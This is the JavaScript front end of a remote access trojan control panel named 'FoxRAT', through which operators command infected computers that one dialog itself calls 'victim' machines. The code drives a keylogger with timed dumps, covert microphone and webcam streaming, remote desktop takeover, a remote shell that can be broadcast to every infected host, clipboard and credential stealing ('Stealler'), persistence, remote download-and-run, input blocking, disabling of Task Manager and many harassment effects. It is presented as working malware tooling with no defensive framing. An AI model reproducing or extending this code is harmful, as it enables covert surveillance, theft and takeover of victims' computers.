const WS_URL = `ws://${location.host}`;
let ws = null;
let clients = {};
let selectedClient = null;
let cmdSeq = 0;
let prevClientIds = new Set();
let screenW = 1920, screenH = 1080;
let inputEnabled = false;
let inputMode = 'all';
let sessionToken = localStorage.getItem('foxrat_token') || null;
let currentUsername = localStorage.getItem('foxrat_user') || null;

// ===== Toast =====
function showToast(title, msg, type = 'info', duration = 5000) {
    const c = document.getElementById('toast-container');
    const el = document.createElement('div');
    el.className = `toast toast-${type}`;
    el.innerHTML = `<div class="toast-title">${title}</div><div class="toast-msg">${msg}</div><div class="toast-time">${new Date().toLocaleTimeString()}</div>`;
    el.onclick = () => { el.classList.add('toast-out'); setTimeout(() => el.remove(), 300); };
    c.appendChild(el);
    setTimeout(() => { if (el.isConnected) { el.classList.add('toast-out'); setTimeout(() => el.remove(), 300); } }, duration);
}

// ===== Auth =====
document.getElementById('auth-show-register').onclick = e => {
    e.preventDefault();
    document.getElementById('auth-login-form').style.display = 'none';
    document.getElementById('auth-register-form').style.display = '';
};
document.getElementById('auth-show-login').onclick = e => {
    e.preventDefault();
    document.getElementById('auth-register-form').style.display = 'none';
    document.getElementById('auth-login-form').style.display = '';
};

document.getElementById('auth-btn').onclick = async () => {
    const username = document.getElementById('auth-user').value;
    const password = document.getElementById('auth-pass').value;
    if (!username || !password) { document.getElementById('auth-err').textContent = 'Fill all fields'; return; }
    try {
        const r = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, password }) });
        const j = await r.json();
        if (j.ok) {
            sessionToken = j.token;
            currentUsername = j.username;
            localStorage.setItem('foxrat_token', sessionToken);
            localStorage.setItem('foxrat_user', currentUsername);
            enterPanel();
        } else {
            document.getElementById('auth-err').textContent = j.error || 'Login failed';
        }
    } catch(e) { document.getElementById('auth-err').textContent = 'Connection failed'; }
};
document.getElementById('auth-pass').onkeydown = e => { if (e.key === 'Enter') document.getElementById('auth-btn').click(); };

document.getElementById('reg-btn').onclick = async () => {
    const username = document.getElementById('reg-user').value;
    const password = document.getElementById('reg-pass').value;
    const password2 = document.getElementById('reg-pass2').value;
    if (!username || !password) { document.getElementById('reg-err').textContent = 'Fill all fields'; return; }
    if (password !== password2) { document.getElementById('reg-err').textContent = 'Passwords dont match'; return; }
    try {
        const r = await fetch('/api/register', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, password }) });
        const j = await r.json();
        if (j.ok) {
            sessionToken = j.token;
            currentUsername = j.username;
            localStorage.setItem('foxrat_token', sessionToken);
            localStorage.setItem('foxrat_user', currentUsername);
            enterPanel();
        } else {
            document.getElementById('reg-err').textContent = j.error || 'Register failed';
        }
    } catch(e) { document.getElementById('reg-err').textContent = 'Connection failed'; }
};
document.getElementById('reg-pass2').onkeydown = e => { if (e.key === 'Enter') document.getElementById('reg-btn').click(); };

function enterPanel() {
    document.getElementById('auth-screen').style.display = 'none';
    document.getElementById('app').style.display = 'flex';
    document.getElementById('sidebar-username').textContent = currentUsername;
    connectWS();
}

if (sessionToken) { enterPanel(); }

// ===== Navigation =====
document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', () => {
        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
        item.classList.add('active');
        const tab = item.dataset.tab;
        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
        const target = document.getElementById('tab-' + tab);
        if (target) target.classList.add('active');
    });
});

// ===== WebSocket =====
let wsReconnectTimer = null;
function connectWS() {
    if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
    if (wsReconnectTimer) { clearTimeout(wsReconnectTimer); wsReconnectTimer = null; }
    try {
        ws = new WebSocket(WS_URL);
    } catch(_) {
        wsReconnectTimer = setTimeout(connectWS, 3000);
        return;
    }
    ws.onopen = () => {
        ws.send(JSON.stringify({ type: 'panel_auth', token: sessionToken }));
        updateStatus(true);
    };
    ws.onclose = () => {
        updateStatus(false);
        wsReconnectTimer = setTimeout(connectWS, 3000);
    };
    ws.onerror = () => {};
    ws.onmessage = e => {
        try {
            const msg = JSON.parse(e.data);
            switch (msg.type) {
                case 'auth_error': localStorage.removeItem('foxrat_token'); localStorage.removeItem('foxrat_user'); location.reload(); break;
                case 'clients': updateClients(msg.list); break;
                case 'user_connected': onUserConnected(msg.client); break;
                case 'user_disconnected': onUserDisconnected(msg.clientId, msg.info); break;
                case 'cmd_result': showCmdResult(msg); break;
                case 'screenshot': handleScreenshot(msg); break;
                case 'audio_data': handleAudioData(msg); break;
                case 'audio_stream': handleAudioStream(msg); break;
                case 'webcam_data': handleWebcamData(msg); break;
                case 'chat_message': handleChatMessage(msg); break;
            }
        } catch(_) {}
    };
}

function updateStatus(online) {
    const s = document.getElementById('sidebar-status');
    s.textContent = online ? 'Connected' : 'Disconnected';
    s.style.color = online ? '#00ff88' : '#f44';
}

// ===== User Connect/Disconnect =====
function playConnectSound() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain); gain.connect(ctx.destination);
        osc.frequency.setValueAtTime(660, ctx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(1320, ctx.currentTime + 0.15);
        gain.gain.setValueAtTime(0.3, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
        osc.start(ctx.currentTime); osc.stop(ctx.currentTime + 0.3);
    } catch(_) {}
}

function onUserConnected(client) {
    const info = client.info || {};
    const name = info.hostname || client.id;
    showToast('User Connected', `${name} (${client.ip})`, 'ok');
    playConnectSound();
}

function onUserDisconnected(clientId, info) {
    const name = (info && info.hostname) || clientId;
    showToast('User Disconnected', `${name}`, 'err');
    if (selectedClient === clientId) { selectedClient = null; updateInfoTab(null); }
}

function updateClients(list) {
    const newIds = new Set(list.map(c => c.id));
    list.forEach(c => {
        if (!prevClientIds.has(c.id) && Object.keys(clients).length > 0) {
            onUserConnected(c);
        }
    });
    prevClientIds.forEach(id => {
        if (!newIds.has(id)) onUserDisconnected(id, clients[id]?.info);
    });
    list.forEach(c => { clients[c.id] = c; });
    prevClientIds = newIds;
    renderUserSelect();
    if (selectedClient && clients[selectedClient]) updateInfoTab(clients[selectedClient]);
}

// ===== User Selector (sidebar) =====
function renderUserSelect() {
    const sel = document.getElementById('sidebar-user-select');
    const ids = Object.keys(clients);
    sel.innerHTML = ids.length ? ids.map(id => {
        const c = clients[id];
        const name = (c.info?.hostname || c.ip || id);
        return `<option value="${id}" ${id === selectedClient ? 'selected' : ''}>${name}</option>`;
    }).join('') : '<option value="">No clients</option>';
    if (!selectedClient && ids.length > 0) {
        selectedClient = ids[0];
        sel.value = ids[0];
        updateInfoTab(clients[ids[0]]);
    }
    document.getElementById('sidebar-hostname').textContent = selectedClient ? (clients[selectedClient]?.info?.hostname || '—') : '—';
}

document.getElementById('sidebar-user-select').onchange = e => {
    selectedClient = e.target.value || null;
    if (selectedClient && clients[selectedClient]) updateInfoTab(clients[selectedClient]);
    document.getElementById('sidebar-hostname').textContent = selectedClient ? (clients[selectedClient]?.info?.hostname || '—') : '—';
};

// ===== Info Tab =====
function updateInfoTab(client) {
    if (!client) {
        ['pi-user','pi-host','pi-id','pi-ip','pi-loc','pi-asn','pi-hosting','pi-awin','pi-os','pi-last','pi-debut','pi-admin','pi-cpu','pi-gpu','pi-ram'].forEach(id => {
            document.getElementById(id).textContent = '—';
        });
        return;
    }
    const info = client.info || {};
    document.getElementById('pi-user').textContent = info.username || '—';
    document.getElementById('pi-host').textContent = info.hostname || '—';
    document.getElementById('pi-id').textContent = client.id;
    document.getElementById('pi-ip').textContent = client.ip || '—';
    document.getElementById('pi-loc').textContent = info.location || '—';
    document.getElementById('pi-asn').textContent = info.asn || '—';
    document.getElementById('pi-hosting').textContent = info.hosting || '—';
    document.getElementById('pi-awin').textContent = info.activeWindow || '—';
    document.getElementById('pi-os').textContent = info.os || '—';
    document.getElementById('pi-last').textContent = client.connectedAt ? new Date(client.connectedAt).toLocaleString() : '—';
    document.getElementById('pi-debut').textContent = info.debut || '—';
    document.getElementById('pi-admin').textContent = info.admin || '—';
    document.getElementById('pi-cpu').textContent = info.cpu || '—';
    document.getElementById('pi-gpu').textContent = info.gpu || '—';
    document.getElementById('pi-ram').textContent = info.ram || '—';
    document.getElementById('bi-id').textContent = info.buildId || '—';
    document.getElementById('bi-ver').textContent = info.buildVersion || '0.25.10';
    document.getElementById('bi-autorun').textContent = info.autorun || 'Registry';
    document.getElementById('bi-path').textContent = info.exePath || '—';
}

document.getElementById('pcinfo-refresh').onclick = () => {
    if (selectedClient) sendCommand(selectedClient, 'sysinfo');
};

// ===== Command Sending =====
function sendCommand(clientId, cmd) {
    const seq = ++cmdSeq;
    fetch('/api/command', {
        method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Session-Token': sessionToken },
        body: JSON.stringify({ clientId, command: { cmd, seq } })
    }).catch(() => {});
    return seq;
}

function showCmdResult(msg) {
    const out = document.getElementById('term-output');
    if (out && msg.clientId === selectedClient) {
        out.textContent += `> ${msg.output || ''}\n`;
        out.scrollTop = out.scrollHeight;
    }
}

// ===== Screenshots =====
function handleScreenshot(msg) {
    if (msg.w && msg.h) { screenW = msg.w; screenH = msg.h; }
    const rdFeed = document.getElementById('rd-feed');
    if (rdFeed && document.getElementById('rd-start')?.disabled) {
        rdFeed.innerHTML = `<img src="data:image/jpeg;base64,${msg.data}" alt="Screen">`;
        inputEnabled = true;
        document.getElementById('rd-mode-status').textContent = inputMode;
        document.getElementById('rd-mode-status').style.color = '#00ff88';
    }
    const wcFeed = document.getElementById('wc-feed');
    if (wcFeed && document.getElementById('wc-start')?.disabled && msg.data) {
        wcFeed.innerHTML = `<img src="data:image/jpeg;base64,${msg.data}" alt="Screen">`;
    }
}

// ===== Audio =====
let livemicCtx = null;
let livemicQueue = [];
let livemicPlaying = false;

function handleAudioData(msg) {
    showToast('Audio', `Received ${msg.duration || '?'}s`, 'ok');
    document.getElementById('audio-status').textContent = 'Ready';
    document.getElementById('audio-status').style.color = '#00ff88';
    if (msg.data) {
        const audio = document.getElementById('audio-playback');
        audio.src = 'data:audio/wav;base64,' + msg.data;
    }
}

function handleAudioStream(msg) {
    if (!msg.data || !livemicCtx) return;
    try {
        const raw = atob(msg.data);
        const bytes = new Uint8Array(raw.length);
        for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
        const samples = new Int16Array(bytes.buffer);
        const float32 = new Float32Array(samples.length);
        for (let i = 0; i < samples.length; i++) float32[i] = samples[i] / 32768.0;
        const audioBuffer = livemicCtx.createBuffer(1, float32.length, 22050);
        audioBuffer.getChannelData(0).set(float32);
        livemicQueue.push(audioBuffer);
        if (!livemicPlaying) playNextChunk();
    } catch(_) {}
}

function playNextChunk() {
    if (livemicQueue.length === 0 || !livemicCtx) { livemicPlaying = false; return; }
    livemicPlaying = true;
    const buffer = livemicQueue.shift();
    const source = livemicCtx.createBufferSource();
    source.buffer = buffer;
    source.connect(livemicCtx.destination);
    source.onended = () => playNextChunk();
    source.start();
}

function startLivemic() {
    if (!selectedClient) return;
    livemicCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 22050 });
    livemicQueue = [];
    livemicPlaying = false;
    sendCommand(selectedClient, 'livemic start');
    document.getElementById('livemic-start').disabled = true;
    document.getElementById('livemic-stop').disabled = false;
    document.getElementById('livemic-status').textContent = 'Listening...';
    document.getElementById('livemic-status').style.color = '#f44';
    document.getElementById('livemic-indicator').style.display = 'block';
}

function stopLivemic() {
    if (selectedClient) sendCommand(selectedClient, 'livemic stop');
    document.getElementById('livemic-start').disabled = false;
    document.getElementById('livemic-stop').disabled = true;
    document.getElementById('livemic-status').textContent = 'Stopped';
    document.getElementById('livemic-status').style.color = '#888';
    document.getElementById('livemic-indicator').style.display = 'none';
    if (livemicCtx) { livemicCtx.close(); livemicCtx = null; }
    livemicQueue = [];
    livemicPlaying = false;
}

document.getElementById('livemic-start').onclick = startLivemic;
document.getElementById('livemic-stop').onclick = stopLivemic;
document.getElementById('livemic-stop').disabled = true;

// ===== Webcam =====
function handleWebcamData(msg) {
    const feed = document.getElementById('wc-feed');
    if (feed && msg.data) {
        feed.innerHTML = `<img src="data:image/jpeg;base64,${msg.data}" alt="Webcam">`;
    }
}

// ===== Remote Desktop =====
document.getElementById('rd-start').onclick = () => {
    if (!selectedClient) return;
    document.getElementById('rd-start').disabled = true;
    document.getElementById('rd-stop').disabled = false;
    sendCommand(selectedClient, 'livemon start');
};
document.getElementById('rd-stop').onclick = () => {
    document.getElementById('rd-start').disabled = false;
    document.getElementById('rd-stop').disabled = true;
    inputEnabled = false;
    document.getElementById('rd-mode-status').textContent = 'Disabled';
    document.getElementById('rd-mode-status').style.color = '#888';
    if (selectedClient) sendCommand(selectedClient, 'livemon stop');
};
document.querySelectorAll('.mode-btn').forEach(btn => {
    btn.onclick = () => {
        document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        inputMode = btn.dataset.mode;
        if (inputEnabled) document.getElementById('rd-mode-status').textContent = inputMode;
    };
});
const rdFeedEl = document.getElementById('rd-feed');
rdFeedEl.addEventListener('click', e => {
    if (!inputEnabled || !selectedClient || inputMode === 'keyboard') return;
    const rect = rdFeedEl.getBoundingClientRect();
    const img = rdFeedEl.querySelector('img');
    if (!img) return;
    const x = Math.round((e.clientX - rect.left) / img.offsetWidth * screenW);
    const y = Math.round((e.clientY - rect.top) / img.offsetHeight * screenH);
    sendCommand(selectedClient, `mousepos ${x} ${y}`);
    sendCommand(selectedClient, 'mouseclick left');
});
document.addEventListener('keydown', e => {
    if (!inputEnabled || !selectedClient || inputMode === 'mouse') return;
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
    if (!document.getElementById('tab-remotedesktop').classList.contains('active')) return;
    if (e.key.length === 1) sendCommand(selectedClient, 'type ' + e.key);
    else if (e.key === 'Enter') sendCommand(selectedClient, 'type \n');
    else if (e.key === 'Backspace') sendCommand(selectedClient, 'type \b');
    else if (e.key === 'Tab') sendCommand(selectedClient, 'type \t');
});

// ===== Webcam Tab =====
document.getElementById('wc-start').onclick = () => {
    if (!selectedClient) return;
    document.getElementById('wc-start').disabled = true;
    document.getElementById('wc-stop').disabled = false;
    document.getElementById('wc-status').textContent = 'Capturing...';
    sendCommand(selectedClient, 'webcam start');
};
document.getElementById('wc-stop').onclick = () => {
    document.getElementById('wc-start').disabled = false;
    document.getElementById('wc-stop').disabled = true;
    document.getElementById('wc-status').textContent = 'Stopped';
    if (selectedClient) sendCommand(selectedClient, 'webcam stop');
};

// ===== Task Manager =====
let tmMode = 'processes';
document.querySelectorAll('.tm-tab').forEach(tab => {
    tab.onclick = () => {
        document.querySelectorAll('.tm-tab').forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        tmMode = tab.dataset.tm;
        document.getElementById('tm-process-list').style.display = tmMode === 'processes' ? 'block' : 'none';
        document.getElementById('tm-devices-list').style.display = tmMode === 'devices' ? 'block' : 'none';
        document.getElementById('tm-windows-list').style.display = tmMode === 'windows' ? 'block' : 'none';
    };
});
document.getElementById('tm-refresh').onclick = () => {
    if (!selectedClient) return;
    if (tmMode === 'processes') sendCommand(selectedClient, 'process list');
    else if (tmMode === 'devices') sendCommand(selectedClient, 'device list');
    else sendCommand(selectedClient, 'window list');
};
document.getElementById('tm-search').oninput = e => {
    const q = e.target.value.toLowerCase();
    document.querySelectorAll('#tm-process-list .tm-item').forEach(el => {
        el.style.display = el.textContent.toLowerCase().includes(q) ? '' : 'none';
    });
};

// ===== File Manager =====
let fmPath = 'C:\\';
document.getElementById('fm-go').onclick = () => {
    fmPath = document.getElementById('fm-path').value;
    if (selectedClient) sendCommand(selectedClient, 'dirlist ' + fmPath);
};
document.getElementById('fm-refresh').onclick = () => {
    if (selectedClient) sendCommand(selectedClient, 'dirlist ' + fmPath);
};

// ===== Terminal =====
document.getElementById('term-send').onclick = () => {
    const input = document.getElementById('term-input');
    if (!input.value || !selectedClient) return;
    sendCommand(selectedClient, 'shell ' + input.value);
    document.getElementById('term-output').textContent += `> ${input.value}\n`;
    input.value = '';
};
document.getElementById('term-input').onkeydown = e => { if (e.key === 'Enter') document.getElementById('term-send').click(); };

// ===== KeyLogger =====
let klAutoInterval = null;
document.getElementById('kl-start').onclick = () => {
    if (!selectedClient) return;
    sendCommand(selectedClient, 'keylog start');
    showToast('KeyLogger', 'Started', 'ok');
    if (document.getElementById('kl-auto').checked) {
        klAutoInterval = setInterval(() => { if (selectedClient) sendCommand(selectedClient, 'keylog dump'); }, 30000);
    }
};
document.getElementById('kl-stop').onclick = () => {
    if (selectedClient) sendCommand(selectedClient, 'keylog stop');
    if (klAutoInterval) { clearInterval(klAutoInterval); klAutoInterval = null; }
};
document.getElementById('kl-dump').onclick = () => {
    if (selectedClient) sendCommand(selectedClient, 'keylog dump');
};

// ===== Clipboard =====
document.getElementById('clip-refresh').onclick = () => {
    if (selectedClient) sendCommand(selectedClient, 'clipboard');
};

// ===== Remote Start =====
document.getElementById('upload-zone').onclick = () => document.getElementById('rs-file').click();
document.getElementById('rs-file').onchange = e => {
    const file = e.target.files[0];
    if (!file || !selectedClient) return;
    const reader = new FileReader();
    reader.onload = () => {
        const b64 = btoa(reader.result);
        sendCommand(selectedClient, 'download ' + URL.createObjectURL(new Blob([reader.result])));
    };
    reader.readAsBinaryString(file);
};
document.getElementById('rs-url-btn').onclick = () => {
    const url = document.getElementById('rs-url').value;
    if (!url || !selectedClient) return;
    sendCommand(selectedClient, 'download ' + url);
    showToast('Remote Start', 'Downloading...', 'ok');
};

// ===== Communication (Chat) =====
document.getElementById('chat-send').onclick = () => {
    const input = document.getElementById('chat-input');
    if (!input.value || !selectedClient) return;
    sendCommand(selectedClient, 'msgbox Chat|' + input.value);
    const box = document.getElementById('chat-messages');
    box.innerHTML += `<div style="color:#00ff88;margin-bottom:4px">[You] ${input.value}</div>`;
    box.scrollTop = box.scrollHeight;
    input.value = '';
};

// ===== Stealler =====
document.getElementById('steal-start').onclick = () => {
    if (!selectedClient) return;
    sendCommand(selectedClient, 'steal');
    showToast('Stealler', 'Started', 'ok');
};

// ===== Context Menu =====
let ctxTargetId = null;
const ctxMenu = document.getElementById('context-menu');

function showCtxMenu(e, clientId) {
    e.preventDefault();
    ctxTargetId = clientId;
    const c = clients[clientId];
    document.getElementById('ctx-user-name').textContent = c ? (c.info?.hostname || clientId) : clientId;
    ctxMenu.style.left = Math.min(e.clientX, window.innerWidth - 200) + 'px';
    ctxMenu.style.top = Math.min(e.clientY, window.innerHeight - 400) + 'px';
    ctxMenu.style.display = 'block';
}

document.addEventListener('click', () => { ctxMenu.style.display = 'none'; });
ctxMenu.addEventListener('click', e => {
    e.stopPropagation();
    const item = e.target.closest('.ctx-item');
    if (!item || !ctxTargetId) return;
    ctxMenu.style.display = 'none';
    const id = ctxTargetId;
    const action = item.dataset.action;
    const nav = (tab) => { document.querySelector(`[data-tab="${tab}"]`)?.click(); };
    switch (action) {
        case 'info': selectedClient = id; renderUserSelect(); updateInfoTab(clients[id]); nav('info'); break;
        case 'screenshot': sendCommand(id, 'screenshot'); break;
        case 'monitor': selectedClient = id; nav('remotedesktop'); document.getElementById('rd-start').click(); break;
        case 'webcam': selectedClient = id; nav('webcam'); document.getElementById('wc-start').click(); break;
        case 'audio': sendCommand(id, 'audio record 5'); break;
        case 'keylog': selectedClient = id; nav('keylogger'); document.getElementById('kl-start').click(); break;
        case 'connect': selectedClient = id; renderUserSelect(); updateInfoTab(clients[id]); nav('info'); break;
        case 'disconnect': if (selectedClient === id) { selectedClient = null; updateInfoTab(null); } renderUserSelect(); break;
        case 'blockmouse': sendCommand(id, 'blockmouse start'); break;
        case 'blockkey': sendCommand(id, 'blockkey start'); break;
        case 'unblockinput': sendCommand(id, 'blockinput stop'); break;
        case 'msgbox': sendCommand(id, 'msgbox FoxRAT|PWNED'); break;
        case 'speak': sendCommand(id, 'speak Hello I am FoxRAT'); break;
        case 'screenoff': sendCommand(id, 'screenoff'); break;
        case 'persist': sendCommand(id, 'persist'); break;
        case 'uninstall': if (confirm('Uninstall?')) sendCommand(id, 'uninstall'); break;
    }
});

// ===== Dashboard =====
let cmdCount = 0;
function updateDashboard() {
    document.getElementById('stat-clients').textContent = Object.keys(clients).length;
    document.getElementById('stat-online').textContent = Object.keys(clients).length;
    document.getElementById('stat-commands').textContent = cmdCount;
}
function dashLog(msg) {
    const log = document.getElementById('dashboard-log');
    if (!log) return;
    const line = document.createElement('div');
    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    log.appendChild(line);
    log.scrollTop = log.scrollHeight;
    if (log.children.length > 200) log.removeChild(log.firstChild);
}
setInterval(updateDashboard, 1000);

// ===== Broadcast =====
document.getElementById('broadcast-btn').onclick = () => {
    const input = document.getElementById('broadcast-input');
    if (!input.value) return;
    Object.keys(clients).forEach(id => {
        sendCommand(id, 'shell ' + input.value);
        cmdCount++;
    });
    dashLog(`BROADCAST: ${input.value}`);
    showToast('Broadcast', `Sent to ${Object.keys(clients).length} clients`, 'ok');
    input.value = '';
};
document.getElementById('broadcast-input').onkeydown = e => { if (e.key === 'Enter') document.getElementById('broadcast-btn').click(); };

// ===== Users Tab =====
function renderUsersList() {
    const container = document.getElementById('users-container');
    if (!container) return;
    const ids = Object.keys(clients);
    document.getElementById('user-count-badge').textContent = ids.length;
    container.innerHTML = ids.length ? ids.map(id => {
        const c = clients[id];
        const name = c.info?.hostname || c.ip || id;
        const ip = c.ip || '—';
        const win = c.info?.activeWindow || '—';
        return `<div class="user-card" data-id="${id}" oncontextmenu="showCtxMenu(event,'${id}')"><div class="user-name">${name}</div><div class="user-ip">${ip}</div><div class="user-win">${win}</div></div>`;
    }).join('') : '<div class="placeholder-text">No users connected</div>';
}
const origUpdateClients = updateClients;
updateClients = function(list) {
    origUpdateClients(list);
    renderUsersList();
    updateDashboard();
};
document.getElementById('user-search').oninput = e => {
    const q = e.target.value.toLowerCase();
    document.querySelectorAll('.user-card').forEach(el => {
        el.style.display = el.textContent.toLowerCase().includes(q) ? '' : 'none';
    });
};

// ===== Fun Tab =====
document.getElementById('fun-msgbox-btn').onclick = () => {
    if (!selectedClient) return;
    const title = document.getElementById('fun-msgbox-title').value || 'FoxRAT';
    const text = document.getElementById('fun-msgbox-text').value || 'Hello';
    sendCommand(selectedClient, 'msgbox ' + title + '|' + text);
    cmdCount++;
    dashLog(`MSGBOX: ${title} | ${text}`);
};
document.getElementById('fun-wallpaper-btn').onclick = () => {
    if (!selectedClient) return;
    const url = document.getElementById('fun-wallpaper-url').value;
    if (url) sendCommand(selectedClient, 'wallpaper ' + url);
};
document.getElementById('fun-speak-btn').onclick = () => {
    if (!selectedClient) return;
    const text = document.getElementById('fun-speak-text').value || 'Hello';
    sendCommand(selectedClient, 'speak ' + text);
};
document.getElementById('fun-cdrom-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'cdrom'); };
document.getElementById('fun-screenoff-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'screenoff'); };
document.getElementById('fun-blockinput-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'blockinput start'); };
document.getElementById('fun-unblockinput-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'blockinput stop'); };
document.getElementById('fun-deskhide-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'desktop hide'); };
document.getElementById('fun-deskshow-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'desktop show'); };
document.getElementById('fun-taskmgroff-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'taskmgr off'); };
document.getElementById('fun-taskmgron-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'taskmgr on'); };
document.getElementById('fun-mousemove-btn').onclick = () => {
    if (!selectedClient) return;
    const x = document.getElementById('fun-mouse-x').value || 500;
    const y = document.getElementById('fun-mouse-y').value || 500;
    sendCommand(selectedClient, 'mousepos ' + x + ' ' + y);
};
document.getElementById('fun-jiggle-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'mousejiggle'); };
document.getElementById('fun-volume').oninput = e => { document.getElementById('fun-volume-val').textContent = e.target.value + '%'; };
document.getElementById('fun-volume-btn').onclick = () => {
    if (!selectedClient) return;
    const vol = document.getElementById('fun-volume').value;
    sendCommand(selectedClient, 'volume ' + vol);
};
document.getElementById('fun-volumemute-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'volumemute'); };
document.getElementById('fun-type-btn').onclick = () => {
    if (!selectedClient) return;
    const text = document.getElementById('fun-type-text').value;
    if (text) sendCommand(selectedClient, 'type ' + text);
};
document.getElementById('fun-dl-btn').onclick = () => {
    if (!selectedClient) return;
    const url = document.getElementById('fun-dl-url').value;
    if (url) sendCommand(selectedClient, 'download ' + url);
};
document.getElementById('fun-prockill-btn').onclick = () => {
    if (!selectedClient) return;
    const name = document.getElementById('fun-proc-name').value;
    if (name) sendCommand(selectedClient, 'prockill ' + name);
};
document.getElementById('fun-procstart-btn').onclick = () => {
    if (!selectedClient) return;
    const name = document.getElementById('fun-proc-name').value;
    if (name) sendCommand(selectedClient, 'procstart ' + name);
};
document.getElementById('fun-proclist-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'process list'); };
document.getElementById('fun-taskkillall-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'taskkillall'); };
document.getElementById('fun-idle-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'idle'); };
document.getElementById('fun-persist-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'persist'); };
document.getElementById('fun-uninstall-btn').onclick = () => { if (selectedClient && confirm('Uninstall from victim?')) sendCommand(selectedClient, 'uninstall'); };

// ===== Screen Effects =====
document.getElementById('fun-flip-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'flip'); };
document.getElementById('fun-invert-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'invert'); };
document.getElementById('fun-blackout-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'blackout'); };
document.getElementById('fun-matrix-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'matrix'); };
document.getElementById('fun-rainbow-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'rainbow'); };
document.getElementById('fun-glitch-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'glitch'); };
document.getElementById('fun-spiral-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'spiral'); };
document.getElementById('fun-scanlines-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'scanlines'); };
document.getElementById('fun-thermal-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'thermal'); };
document.getElementById('fun-nightvision-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'nightvision'); };
document.getElementById('fun-invertcolors-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'invertcolors'); };
document.getElementById('fun-disco-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'disco'); };
document.getElementById('fun-blue-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'blue'); };
document.getElementById('fun-redscreen-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'redscreen'); };
document.getElementById('fun-green-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'green'); };
document.getElementById('fun-white-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'white'); };
document.getElementById('fun-rotate-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'rotate'); };
document.getElementById('fun-restorescreen-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'restorescreen'); };

// ===== Cursor =====
document.getElementById('fun-penis-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'penis on'); };
document.getElementById('fun-cursorbig-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'cursorbig'); };
document.getElementById('fun-cursorhide-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'cursorhide'); };
document.getElementById('fun-cursorshow-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'cursorshow'); };
document.getElementById('fun-spider-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'spider'); };
document.getElementById('fun-dizzy-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'dizzy'); };
document.getElementById('fun-penis-off-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'penis off'); };

// ===== Window Chaos =====
document.getElementById('fun-shrink-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'shrink'); };
document.getElementById('fun-maxall-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'maxall'); };
document.getElementById('fun-cascade-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'cascade'); };
document.getElementById('fun-tile-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'tile'); };
document.getElementById('fun-alwaystop-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'alwaystop'); };
document.getElementById('fun-notop-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'notop'); };
document.getElementById('fun-fullscreen-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'fullscreen'); };
document.getElementById('fun-shake-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'shake'); };
document.getElementById('fun-elevator-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'elevator'); };
document.getElementById('fun-puzzle-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'puzzle'); };
